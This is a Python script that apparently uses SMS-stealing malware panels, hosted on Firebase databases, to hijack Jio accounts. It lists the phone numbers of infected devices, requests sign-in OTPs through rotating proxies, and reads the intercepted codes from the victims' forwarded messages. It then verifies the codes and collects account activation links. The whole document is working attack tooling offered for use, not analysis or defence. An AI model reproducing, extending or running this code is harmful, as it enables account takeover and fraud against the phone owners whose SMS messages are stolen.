#!/usr/bin/env python3
"""brutal_claim.py — aggressive multi-panel freshlink generator.

The v2 harvester (otp_harvest.py) only understands the AllData/GlobalSms
schema.  The rtx family (rtx-c3 / rtx-c9 / rtx-c11) uses the legacy schema:

    /users/<deviceId>      -> {Sim1, Sim2, device_name, time}
    /data/<deviceId>/smsData/<msgId> -> {info, message, sender, time}
    /common/smsData        -> dedup feed across devices

This module drives the full cycle against every panel at once:

    refresh live mobiles from /users
    -> rank by freshness (last-seen age)
    -> fire OTP through rotating Indian exits
    -> poll the panel for the forwarded code (device-attributed)
    -> verify against Jio and walk the activation flow
    -> emit the freshlink

Parallelism is per-number; the panel read for OTP polling is shared per panel
so the RTDB is not hammered once per worker.

Usage:
    python3 brutal_claim.py [--workers 8] [--max 40] [--timeout 75]
"""

from __future__ import annotations

import argparse
import json
import random
import re
import sys
import threading
import time
from concurrent.futures import ThreadPoolExecutor, as_completed
from pathlib import Path

import requests

sys.path.insert(0, str(Path(__file__).resolve().parent))

from farm import (activation_url, already_active, api_message, get_activation,
                  jio_session, load_proxies, mark_proxy_dead, next_proxy,
                  send_otp, verify_otp)

DATA = Path(__file__).resolve().parent / "data"
LINKS_FILE = DATA / "brutal_freshlinks.jsonl"
LOCKED_FILE = DATA / "brutal_locked.json"
STATE_FILE = DATA / "brutal_state.json"

PANELS = {
    "rtx-c9": "https://rtx-c9-default-rtdb.asia-southeast1.firebasedatabase.app",
    "rtx-c11": "https://rtx-c11-default-rtdb.asia-southeast1.firebasedatabase.app",
    "rtx-c3": "https://rtx-c3-default-rtdb.firebaseio.com",
}

MOBILE_RE = re.compile(r"[6-9]\d{9}")
# the exact Jio sign-in template forwarded by the panels
JIO_OTP_RE = re.compile(
    r"(?<!\d)(\d{6})(?!\d)\s+is your One time password \(OTP\) to sign-in",
    re.I,
)
# looser fallback for panels that truncate the template
JIO_OTP_LOOSE = re.compile(
    r"(?<!\d)(\d{6})(?!\d)\D{0,40}(?:one[\s\-]?time[\s\-]?password|OTP|sign-?in)", re.I)

TS_RE = re.compile(r"(\d{4}-\d{2}-\d{2}) \| (\d{2}):(\d{2}):(\d{2})")

UA = ("Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 "
      "(KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36")

_LOCK = threading.Lock()


def _ts_epoch(value: str) -> float:
    m = TS_RE.search(value or "")
    if not m:
        return 0.0
    y, mo, d, h, mi, s = (int(x) for x in m.groups())
    return time.mktime((y, mo, d, h, mi, s, 0, 0, -1))


class PanelClient:
    """Reads the legacy rtx schema and attributes OTPs to devices."""

    def __init__(self, tag: str, base: str):
        self.tag = tag
        self.base = base
        self.s = requests.Session()
        self.s.headers.update({"User-Agent": UA, "Accept": "application/json"})
        self._devices: list[str] | None = None
        self._sms: dict[str, dict] = {}
        self._sms_ts = 0.0

    # ------------------------------------------------------------- inventory
    def live_mobiles(self) -> list[dict]:
        """Every SIM in /users, ranked by how recently the device checked in."""
        try:
            u = self.s.get(f"{self.base}/users.json", timeout=60).json()
        except (requests.RequestException, ValueError):
            return []
        now = time.time()
        out = []
        for dev, v in (u or {}).items():
            if not isinstance(v, dict):
                continue
            age = now - _ts_epoch(v.get("time", ""))
            for slot in ("Sim1", "Sim2"):
                n = (v.get(slot) or "").replace("+91", "").replace(" ", "").strip()
                if MOBILE_RE.fullmatch(n):
                    out.append({"mobile": n, "device": dev, "panel": self.tag,
                                "sim": 1 if slot == "Sim1" else 2,
                                "age_min": round(age / 60, 1),
                                "device_name": v.get("device_name", "")})
        out.sort(key=lambda r: r["age_min"])
        return out

    def devices(self) -> list[str]:
        if self._devices is None:
            try:
                d = self.s.get(f"{self.base}/data.json?shallow=true",
                               timeout=90).json()
                self._devices = list((d or {}).keys())
            except (requests.RequestException, ValueError):
                self._devices = []
        return self._devices

    # ------------------------------------------------------------------- sms
    def _refresh_sms(self, force: bool = False) -> None:
        """Pull every device's smsData once per poll window (shared read)."""
        with _LOCK:
            if not force and time.time() - self._sms_ts < 2.0:
                return
            self._sms_ts = time.time()
        merged: dict[str, dict] = {}
        for dev in self.devices():
            try:
                r = self.s.get(f"{self.base}/data/{dev}/smsData.json", timeout=45)
                if r.status_code == 200 and isinstance(r.json(), dict):
                    for mid, sms in r.json().items():
                        if isinstance(sms, dict):
                            merged[f"{dev}:{mid}"] = sms
            except (requests.RequestException, ValueError):
                continue
        with _LOCK:
            self._sms = merged

    def otp_for(self, mobile: str, since: float) -> str | None:
        """Newest Jio OTP on the SIM holding `mobile` after `since`."""
        self._refresh_sms()
        with _LOCK:
            items = list(self._sms.items())
        best: tuple[float, str] | None = None
        for _key, sms in items:
            info = sms.get("info") or ""
            if mobile not in info.replace("+91", ""):
                continue
            body = sms.get("message") or ""
            sender = (sms.get("sender") or "").upper()
            if not any(j in sender for j in ("JIONET", "JIOFPS", "JIOPAY", "JIOINF")):
                continue
            m = JIO_OTP_RE.search(body) or JIO_OTP_LOOSE.search(body)
            if not m:
                continue
            ts = _ts_epoch(sms.get("time", ""))
            if ts >= since and (best is None or ts > best[0]):
                best = (ts, m.group(1))
        return best[1] if best else None


# --------------------------------------------------------------------- state
def _load(p: Path, default):
    try:
        return json.loads(p.read_text())
    except Exception:
        return default


def _append_link(rec: dict) -> None:
    with LINKS_FILE.open("a") as fh:
        fh.write(json.dumps(rec, ensure_ascii=False) + "\n")


def _save_state(**kw) -> None:
    st = _load(STATE_FILE, {})
    st.update(kw)
    st["ts"] = int(time.time())
    STATE_FILE.write_text(json.dumps(st, indent=1))


# ------------------------------------------------------------------- worker
def claim_one(clients: dict[str, PanelClient], cand: dict,
              timeout: int, done: set[str], locked: set[str]) -> dict:
    mobile = cand["mobile"]
    if mobile in done or mobile in locked:
        return {"mobile": mobile, "ok": False, "status": "skip"}

    pc = clients[cand["panel"]]
    before = time.time() - 120  # ignore codes already in the inbox

    ok, status, s, _px = send_otp(mobile)
    if not ok or s is None:
        if status in ("locked", "not_jio_number"):
            with _LOCK:
                locked.add(mobile)
                LOCKED_FILE.write_text(json.dumps(sorted(locked)))
        return {"mobile": mobile, "ok": False, "status": status}

    otp = None
    deadline = time.monotonic() + timeout
    while time.monotonic() < deadline:
        otp = pc.otp_for(mobile, before)
        if otp:
            break
        time.sleep(2.5)

    if not otp:
        return {"mobile": mobile, "ok": False, "status": "otp_timeout",
                "device": cand["device"], "panel": cand["panel"]}

    if not verify_otp(s, mobile, otp):
        return {"mobile": mobile, "ok": False, "status": "verify_failed",
                "otp": otp, "device": cand["device"], "panel": cand["panel"]}

    st, url = get_activation(s)
    rec = {"mobile": mobile, "ok": bool(url), "status": st, "otp": otp,
           "device": cand["device"], "panel": cand["panel"],
           "device_name": cand.get("device_name", ""), "ts": int(time.time())}
    if url:
        rec["url"] = url
        _append_link(rec)
        with _LOCK:
            done.add(mobile)
    return rec


def main() -> int:
    ap = argparse.ArgumentParser()
    ap.add_argument("--workers", type=int, default=8)
    ap.add_argument("--max", type=int, default=40)
    ap.add_argument("--timeout", type=int, default=75)
    ap.add_argument("--refresh", type=int, default=120)
    args = ap.parse_args()

    load_proxies()
    clients = {t: PanelClient(t, b) for t, b in PANELS.items()}
    locked = set(_load(LOCKED_FILE, []))
    done = {json.loads(l)["mobile"] for l in
            LINKS_FILE.read_text().splitlines() if l.strip()} \
        if LINKS_FILE.exists() else set()

    got = 0
    attempts = 0
    last_refresh = 0.0
    cands: list[dict] = []

    while got < args.max:
        if time.time() - last_refresh > args.refresh or not cands:
            cands = []
            for pc in clients.values():
                cands.extend(pc.live_mobiles())
            # dedupe: same SIM can appear on two slots/panels
            seen: set[str] = set()
            uniq = []
            for c in sorted(cands, key=lambda r: r["age_min"]):
                if c["mobile"] in seen:
                    continue
                seen.add(c["mobile"])
                uniq.append(c)
            cands = [c for c in uniq
                     if c["mobile"] not in done and c["mobile"] not in locked]
            last_refresh = time.time()
            _save_state(pass_candidates=len(cands), got=got, attempts=attempts,
                        locked=len(locked), done=len(done))
            print(f"[*] {len(cands)} candidates across {len(clients)} panels",
                  flush=True)
            if not cands:
                print("[*] exhausted, waiting for fresh devices...", flush=True)
                time.sleep(30)
                continue

        batch = cands[:args.workers * 2]
        cands = cands[len(batch):]
        with ThreadPoolExecutor(max_workers=args.workers) as ex:
            futs = {ex.submit(claim_one, clients, c, args.timeout, done, locked): c
                    for c in batch}
            for f in as_completed(futs):
                attempts += 1
                try:
                    r = f.result()
                except Exception as exc:
                    print(f"[!] {type(exc).__name__}: {exc}", flush=True)
                    continue
                if r.get("ok"):
                    got += 1
                    print(f"[LINK] {r['mobile']} ({r['panel']}) {r['otp']}",
                          flush=True)
                    print(f"       {r['url']}", flush=True)
                else:
                    print(f"[{r['status']}] {r['mobile']}", flush=True)
                if got >= args.max:
                    break
        _save_state(got=got, attempts=attempts, locked=len(locked),
                    done=len(done), remaining=len(cands))

    print(f"\n[done] {got} freshlinks / {attempts} attempts")
    return 0


if __name__ == "__main__":
    sys.exit(main())
